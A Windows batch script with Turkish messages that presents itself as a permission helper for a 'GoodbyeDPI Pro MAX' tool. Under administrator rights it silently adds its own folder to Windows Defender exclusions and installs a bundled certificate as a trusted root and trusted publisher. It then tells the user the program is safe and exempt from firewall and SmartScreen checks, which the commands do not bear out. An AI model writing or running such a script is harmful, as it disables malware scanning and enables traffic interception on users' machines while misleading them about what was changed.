@echo off
chcp 65001 >nul
title GoodbyeDPI Pro MAX - Guvenlik Izni Araci

:: Yonetici haklari kontrolu
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] HATA: Bu arac yonetici yetkileri gerektirir.
    echo Lutfen bu dosyaya SAG TIKLAYIP "Yonetici olarak calistir" secin.
    echo.
    pause
    exit /b 1
)

echo ================================================================
echo   GoodbyeDPI Pro MAX — Guvenlik Duvari ve Antivirus Izin Araci
echo ================================================================
echo.
echo [1/2] Program klasoru Windows Defender dislamalarina ekleniyor...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

echo [2/2] GoodbyeDPI dijital sertifikasi sisteme yukleniyor...
if exist "%~dp0GoodbyeDPI_Cert.cer" (
    certutil -addstore -f "TrustedPublisher" "%~dp0GoodbyeDPI_Cert.cer" >nul 2>&1
    certutil -addstore -f "Root" "%~dp0GoodbyeDPI_Cert.cer" >nul 2>&1
)

echo.
echo [BASARILI] Program Guvenlik Duvari ve SmartScreen engellerinden muaf tutuldu!
echo Artik GoodbyeDPI_ProMAX.exe dosyasini guvenle baslatabilirsiniz.
echo.
pause
